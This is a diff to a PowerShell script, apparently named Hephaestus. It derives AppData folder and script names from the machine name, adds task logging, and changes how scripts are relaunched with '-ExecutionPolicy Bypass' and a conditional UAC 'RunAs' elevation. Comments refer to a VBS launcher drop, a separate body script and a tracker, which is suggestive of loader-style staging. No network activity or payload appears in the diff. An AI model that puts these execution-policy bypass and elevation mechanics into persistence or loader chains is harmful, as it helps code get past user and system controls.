@@ -207,28 +207,66 @@ function writedbg {
     }
 }
 
+# Roaming subfolder + script basename (sanitized [Environment]::MachineName); matches launcher.vbs. Get-MachineCode stays for registry/tracker.
+function Get-HephaestusDirName {
+    $n = [Environment]::MachineName
+    if ([string]::IsNullOrWhiteSpace($n)) { return 'Hephaestus' }
+    $sb = [System.Text.StringBuilder]::new()
+    foreach ($ch in $n.ToCharArray()) {
+        if ([char]::IsLetterOrDigit($ch) -or $ch -eq '-' -or $ch -eq '_') { [void]$sb.Append($ch) } else { [void]$sb.Append('_') }
+    }
+    $out = $sb.ToString().Trim('_')
+    if ([string]::IsNullOrWhiteSpace($out)) { return 'Hephaestus' }
+    if ($out.Length -gt 32) { return $out.Substring(0, 32) }
+    return $out
+}
+
 function Get-HephaestusFolder {
     $appDataPath = [System.Environment]::GetFolderPath('ApplicationData')
-    $hephaestusFolder = Join-Path $appDataPath $($(Get-MachineCode))
-    return $hephaestusFolder
+    return (Join-Path $appDataPath (Get-HephaestusDirName))
 }
 
 # Persisted copy of the last-run launcher (e.g. VBS drop) under AppData; used by extract_launcher.
 function Get-LauncherPath {
     $hephaestusFolder = Get-HephaestusFolder
-    $scriptName = (Get-MachineCode) + '.' + 'ps1'
+    $scriptName = (Get-HephaestusDirName) + '.' + 'ps1'
     return (Join-Path $hephaestusFolder -ChildPath $scriptName)
 }
 
 function Get-BodyPath {
     $hephaestusFolder = Get-HephaestusFolder
-    $scriptName = (Get-MachineCode) + '_b.' + 'ps1'
+    $scriptName = (Get-HephaestusDirName) + '_b.' + 'ps1'
     $bodyPath = Join-Path $hephaestusFolder -ChildPath $scriptName
     return $bodyPath
 }
 
 function Get-HephaestusDiagLogPath {
     return (Join-Path (Get-HephaestusFolder) "hephaestus_diag.log")
+}
+
+# Per-task append-only log (START/STOP) under Hephaestus folder; idempotent across runs.
+function Write-TaskLifecycleLog {
+    param(
+        [Parameter(Mandatory = $true)][string]$TaskName,
+        [Parameter(Mandatory = $true)][ValidateSet('START', 'STOP')][string]$Phase,
+        [string]$Detail = ''
+    )
+    try {
+        $dir = Get-HephaestusFolder
+        if (-not (Test-Path -LiteralPath $dir)) {
+            [void][System.IO.Directory]::CreateDirectory($dir)
+        }
+        $safe = ($TaskName -replace '[^\w\-\.]', '_')
+        if ([string]::IsNullOrWhiteSpace($safe)) { $safe = 'unknown' }
+        $path = Join-Path $dir "task_$safe.log"
+        $stamp = (Get-Date).ToString("o")
+        $line = "[$stamp] $Phase task=$TaskName pid=$PID"
+        if (-not [string]::IsNullOrWhiteSpace($Detail)) { $line += " $Detail" }
+        [System.IO.File]::AppendAllText($path, $line.TrimEnd() + [Environment]::NewLine)
+    }
+    catch {
+        try { [Console]::Error.WriteLine("Write-TaskLifecycleLog failed: $_") } catch { }
+    }
 }
 
 function Reset-HephaestusDiagLog {
@@ -476,9 +514,10 @@ function RunMe {
     $argName = EnsureDashPrefix -value $argName
 
     $scriptPath = $script
-    
-    $local = @("-ExecutionPolicy", "Bypass", "-File", """$scriptPath""")
-    
+
+    # Start-Process -ArgumentList must be separate tokens (string[]). A single concatenated string is passed as one argv and powershell.exe will not run -File correctly.
+    $local = @('-ExecutionPolicy', 'Bypass', '-File', $scriptPath)
+
     if ($repassArgs -eq $true) {
         $globalArgs = $global:args
         $filteredArgs = @()
@@ -502,17 +541,11 @@ function RunMe {
         $local += $globalArgs
         if (-not [string]::IsNullOrEmpty($argName) -and $argName -ne "-") {
             $local += $argName
-            $local += $argValue
+            $local += [string]$argValue
         }
     }
 
-    $argumentList = ""
-    for ($i = 0; $i -lt $local.Count; $i += 1) {
-        $arg = $local[$i]
-        $argumentList += "$arg "
-    }
-
-    writedbg "starting  $argumentList"
+    writedbg ("starting " + ($local -join ' '))
 
     $workDir = Split-Path -Parent -Path $scriptPath
     if ([string]::IsNullOrEmpty($workDir)) { $workDir = $PWD.Path }
@@ -522,9 +555,10 @@ function RunMe {
         FilePath         = "powershell.exe"
         WorkingDirectory = $workDir
         WindowStyle      = $style
-        ArgumentList     = $argumentList
+        ArgumentList     = $local
     }
-    if ($uac -eq $true) { $sp["Verb"] = "RunAs" }
+    # RunAs from an already-elevated process prompts again / can fail; only request UAC when not admin yet.
+    if ($uac -eq $true -and -not (IsElevated)) { $sp["Verb"] = "RunAs" }
 
     if ($Wait) {
         $proc = Start-Process @sp -PassThru -Wait -ErrorAction Stop
